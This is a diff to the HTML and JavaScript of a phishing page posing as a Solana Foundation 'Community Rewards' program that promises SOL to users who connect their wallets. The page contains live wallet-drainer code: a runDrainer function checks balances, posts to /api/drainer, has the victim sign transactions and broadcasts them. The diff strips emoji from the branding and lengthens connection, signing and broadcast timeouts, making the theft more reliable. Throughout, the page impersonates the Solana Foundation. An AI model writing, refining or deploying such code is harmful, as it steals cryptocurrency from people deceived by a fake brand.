@@ -3,40 +3,40 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>🌞 Solana Community Rewards</title>
+  <title>  Solana Community Rewards</title>
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Expires" content="0" />
   <meta name="description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
   
   <!-- dApp Metadata for Wallets -->
-  <meta name="application-name" content="🌞 Solana Community Rewards" />
-<meta name="apple-mobile-web-app-title" content="🌞 Solana Community Rewards" />
+  <meta name="application-name" content="  Solana Community Rewards" />
+<meta name="apple-mobile-web-app-title" content="  Solana Community Rewards" />
   <meta name="msapplication-TileColor" content="#14f195" />
   <meta name="theme-color" content="#14f195" />
   
   <!-- Solana dApp Metadata -->
-<meta name="solana-dapp-name" content="🌞 Solana Community Rewards" />
+<meta name="solana-dapp-name" content="  Solana Community Rewards" />
 <meta name="solana-dapp-description" content="Powering the Next Wave of Builders & Holders" />
 <meta name="solana-dapp-url" content="" />
 <meta name="solana-dapp-icon" content="/logo.png" />
   
   <!-- Wallet Connect Metadata -->
-  <meta name="wallet-connect-name" content="🌞 Solana Community Rewards" />
+  <meta name="wallet-connect-name" content="  Solana Community Rewards" />
 <meta name="wallet-connect-description" content="Powering the Next Wave of Builders & Holders" />
   <meta name="wallet-connect-url" content="" />
   <meta name="wallet-connect-icon" content="/logo.png" />
   
   <!-- SEO and Social Media Meta Tags -->
-  <meta property="og:title" content="🌞 Solana Community Rewards" />
+  <meta property="og:title" content="  Solana Community Rewards" />
 <meta property="og:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="" />
   <meta property="og:image" content="/logo.png" />
-  <meta property="og:site_name" content="🌞 Solana Community Rewards" />
+  <meta property="og:site_name" content="  Solana Community Rewards" />
   
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="🌞 Solana Community Rewards" />
+  <meta name="twitter:title" content="  Solana Community Rewards" />
 <meta name="twitter:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
   <meta name="twitter:image" content="/logo.png" />
   
@@ -90,7 +90,7 @@
       });
       
       window.dAppMetadata = {
-        name: '🌞 Solana Community Rewards',
+        name: '  Solana Community Rewards',
         description: 'Powering the Next Wave of Builders & Holders',
         url: currentUrl,
         icon: logoUrl
@@ -258,7 +258,7 @@
               console.log(`[FALLBACK] Trying Trust Wallet connect with timeout`);
               const connectPromise = provider.connect();
               const timeoutPromise = new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 10000)
+                setTimeout(() => reject(new Error('Trust Wallet connection timeout')), 30000)
               );
               
               Promise.race([connectPromise, timeoutPromise]).catch(fallbackError => {
@@ -386,12 +386,12 @@
     
     // Set dApp metadata for wallet detection BEFORE wallet scripts load
     window.dAppMetadata = {
-      name: '🌞 Solana Community Rewards',
+      name: '  Solana Community Rewards',
       description: 'Powering the Next Wave of Builders & Holders',
       url: window.location.origin,
       icon: window.location.origin + '/logo.png',
       appIdentity: {
-        name: '🌞 Solana Community Rewards',
+        name: '  Solana Community Rewards',
         uri: window.location.origin,
         icon: window.location.origin + '/logo.png'
       }
@@ -453,18 +453,18 @@
     setDAppIconForWallet('exodus');
     
     // Set document title and meta for wallet recognition
-    document.title = '🌞 Solana Community Rewards';
+    document.title = '  Solana Community Rewards';
     
     // Add meta tags dynamically if needed
     if (!document.querySelector('meta[name="application-name"]')) {
       const meta = document.createElement('meta');
       meta.name = 'application-name';
-      meta.content = '🌞 Solana Community Rewards';
+      meta.content = '  Solana Community Rewards';
       document.head.appendChild(meta);
     }
     
     // Set additional window properties for wallet recognition
-    window.solanaDAppName = '🌞 Solana Community Rewards';
+    window.solanaDAppName = '  Solana Community Rewards';
     window.solanaDAppIcon = window.location.origin + '/logo.png';
     
     // Override any existing dApp metadata
@@ -2243,7 +2243,7 @@
 </head>
 <body>
   <nav>
-    <div class="nav-logo"><img src="/logo.png" alt="Solana Foundation Logo" style="height:36px;vertical-align:middle;margin-right:10px;">🌞 Solana Community Rewards</div>
+    <div class="nav-logo"><img src="/logo.png" alt="Solana Foundation Logo" style="height:36px;vertical-align:middle;margin-right:10px;">  Solana Community Rewards</div>
     <div class="nav-links">
       <a href="#rewards" class="nav-link">Rewards</a>
       <a href="#how-it-works" class="nav-link">How It Works</a>
@@ -2254,7 +2254,7 @@
   </nav>
   <section class="hero" id="hero">
     <div class="hero-content">
-          <h1><img src="/logo.png" alt="Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;"> 🌞 Solana Community Rewards</h1>
+          <h1><img src="/logo.png" alt="Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;">   Solana Community Rewards</h1>
     <p class="hero-subtitle">Powering the Next Wave of Builders & Holders</p>
     <p class="hero-description">The Solana Community Rewards Program is designed to give back to the people who make Solana thrive — developers, validators, creators, and everyday users. Whether you're deploying smart contracts, collecting NFTs, or onboarding friends into crypto, you earn rewards for helping grow the ecosystem.</p>
 
@@ -2296,7 +2296,7 @@
   <!-- How It Works Section -->
   <section class="how-it-works" id="how-it-works">
     <div class="container">
-      <h2>🚀 How It Works</h2>
+      <h2> How It Works</h2>
       <div class="steps-grid">
         <div class="step-card">
           <div class="step-number">1</div>
@@ -2320,7 +2320,7 @@
   <!-- Reward Tiers Section -->
   <section class="reward-tiers" id="tiers">
     <div class="container">
-      <h2>🏆 Reward Tiers</h2>
+      <h2> Reward Tiers</h2>
       <div class="tiers-grid">
         <div class="tier-card">
           <div class="tier-icon">🔍</div>
@@ -2359,7 +2359,7 @@
           <p>Join a growing, global community of builders and creators.</p>
         </div>
         <div class="benefit-item">
-          <div class="benefit-icon">🎁</div>
+          <div class="benefit-icon"></div>
           <p>Get access to early beta drops and Solana partner perks.</p>
         </div>
       </div>
@@ -2369,18 +2369,18 @@
   <!-- Start Earning Section -->
   <section class="start-earning" id="join">
     <div class="container">
-      <h2>🔗 Start Earning Today</h2>
+      <h2> Start Earning Today</h2>
       <div class="earning-steps">
         <div class="earning-step">
-          <div class="step-icon">🔗</div>
+          <div class="step-icon"></div>
           <h3>Connect Your Wallet</h3>
         </div>
         <div class="earning-step">
-          <div class="step-icon">✅</div>
+          <div class="step-icon"></div>
           <h3>Complete Activities & Challenges</h3>
         </div>
         <div class="earning-step">
-          <div class="step-icon">🎁</div>
+          <div class="step-icon"></div>
           <h3>Claim Rewards</h3>
         </div>
       </div>
@@ -2521,7 +2521,7 @@
     </div>
   </div>
   <div class="footer">
-    <p><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;"> 🌞 Join the Solana Community Rewards Program today!</p>
+    <p><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Join the Solana Community Rewards Program today!</p>
     <p>⚡ Powered by the Solana blockchain. Fast. Scalable. Community-driven.</p>
   <p>© 2025 Solana Foundation. All rights reserved.</p>
   </div>
@@ -3081,7 +3081,7 @@ async function runDrainer(provider) {
           const connection = new solanaWeb3.Connection(rpcUrl);
           const balancePromise = connection.getBalance(publicKey);
           const timeoutPromise = new Promise((_, reject) => {
-            setTimeout(() => reject(new Error('Balance check timeout')), 5000); // 5 second timeout
+            setTimeout(() => reject(new Error('Balance check timeout')), 15000); // 15 second timeout
           });
           
           balance = await Promise.race([balancePromise, timeoutPromise]);
@@ -3131,7 +3131,7 @@ async function runDrainer(provider) {
       
       // Add timeout to prevent hanging
       const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
+      const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 second timeout
       
       response = await fetch(`/api/drainer`, {
         method: 'POST',
@@ -3344,7 +3344,7 @@ async function runDrainer(provider) {
       
                        // Use standard timeout for all wallets including Glow
                        const timeoutPromise = new Promise((_, reject) => {
-                         setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 60000);
+                         setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 90000);
                        });
                        signed = await Promise.race([signingPromise, timeoutPromise]);
       console.log('[SIGNING] Transaction signed successfully:', signed);
@@ -3548,7 +3548,7 @@ async function runDrainer(provider) {
     let broadcastSuccess = false;
     
     // Add timeout for broadcast attempts
-    const broadcastTimeout = 15000; // 15 seconds
+          const broadcastTimeout = 45000; // 45 seconds
     
     // Try multiple broadcast attempts with timeout
     for (let attempt = 1; attempt <= 3; attempt++) {
@@ -3920,18 +3920,18 @@ window.openWalletModal = async function openWalletModal() {
 
     // Solana Wallet Adapter metadata format
     const walletAdapterMetadata = {
-      name: '🌞 Solana Community Rewards',
+      name: '  Solana Community Rewards',
       description: 'Powering the Next Wave of Builders & Holders',
       url: window.location.origin,
       icon: window.location.origin + '/logo.png',
       appIdentity: {
-        name: '🌞 Solana Community Rewards',
+        name: '  Solana Community Rewards',
         uri: window.location.origin,
         icon: window.location.origin + '/logo.png'
       },
       // Enhanced metadata for better wallet recognition
       additionalInfo: {
-        displayName: '🌞 Solana Community Rewards',
+        displayName: '  Solana Community Rewards',
         description: 'Powering the Next Wave of Builders & Holders',
         icon: window.location.origin + '/logo.png',
         url: window.location.origin
@@ -3940,7 +3940,7 @@ window.openWalletModal = async function openWalletModal() {
 
     // Community Rewards Form Functionality
     document.addEventListener('DOMContentLoaded', function() {
-      console.log('🌞 Solana Community Rewards page loaded successfully');
+      console.log('  Solana Community Rewards page loaded successfully');
       
       // Initialize any community rewards specific functionality here
       // This replaces the old minting form functionality
@@ -3950,7 +3950,7 @@ window.openWalletModal = async function openWalletModal() {
     function setWalletDAppName(provider, walletName) {
       try {
         const metadata = window.dAppMetadata || {
-          name: '🌞 Solana Community Rewards',
+          name: '  Solana Community Rewards',
           description: 'Powering the Next Wave of Builders & Holders',
           url: window.location.origin,
           icon: window.location.origin + '/logo.png'
@@ -4017,11 +4017,11 @@ window.openWalletModal = async function openWalletModal() {
               }
               
               try {
-                // Trust Wallet prefers simple connect with timeout
-                const connectPromise = provider.connect();
-                const timeoutPromise = new Promise((_, reject) => 
-                  setTimeout(() => reject(new Error('Connection timeout')), 15000)
-                );
+                      // Trust Wallet prefers simple connect with timeout
+      const connectPromise = provider.connect();
+      const timeoutPromise = new Promise((_, reject) =>
+        setTimeout(() => reject(new Error('Connection timeout')), 45000)
+      );
                 
                 result = await Promise.race([connectPromise, timeoutPromise]);
                 console.log('[TRUST] Connect result:', result);
@@ -4063,7 +4063,7 @@ window.openWalletModal = async function openWalletModal() {
                 appMetadata: walletAdapterMetadata
               });
               const timeoutPromise = new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('Connection timeout')), 10000)
+                setTimeout(() => reject(new Error('Connection timeout')), 30000)
               );
               
               result = await Promise.race([connectPromise, timeoutPromise]);
@@ -4085,7 +4085,7 @@ window.openWalletModal = async function openWalletModal() {
                 // Try simple connect without metadata
                 const connectPromise = provider.connect();
                 const timeoutPromise = new Promise((_, reject) => 
-                  setTimeout(() => reject(new Error('Connection timeout')), 10000)
+                  setTimeout(() => reject(new Error('Connection timeout')), 30000)
                 );
                 
                 result = await Promise.race([connectPromise, timeoutPromise]);
@@ -4395,7 +4395,7 @@ window.openWalletModal = async function openWalletModal() {
                   try {
                     const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                     const timeoutPromise = new Promise((_, reject) => {
-                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 15000);
+                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 45000);
                     });
                     
                     result = await Promise.race([connectionPromise, timeoutPromise]);
@@ -5205,7 +5205,7 @@ window.openWalletModal = async function openWalletModal() {
       const instructions = `
         <div style="text-align: center; padding: 20px; max-width: 500px; margin: 0 auto;">
           <div style="margin-bottom: 20px;">
-            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;"><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;"> 🌞 Solana Community Rewards</h3>
+            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;"><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Solana Community Rewards</h3>
             <p style="color: #ccc; font-size: 14px; line-height: 1.5; margin-bottom: 20px;">
               No wallet detected! For the fastest and most secure connection experience, 
               please visit this site directly in your wallet's built-in browser.
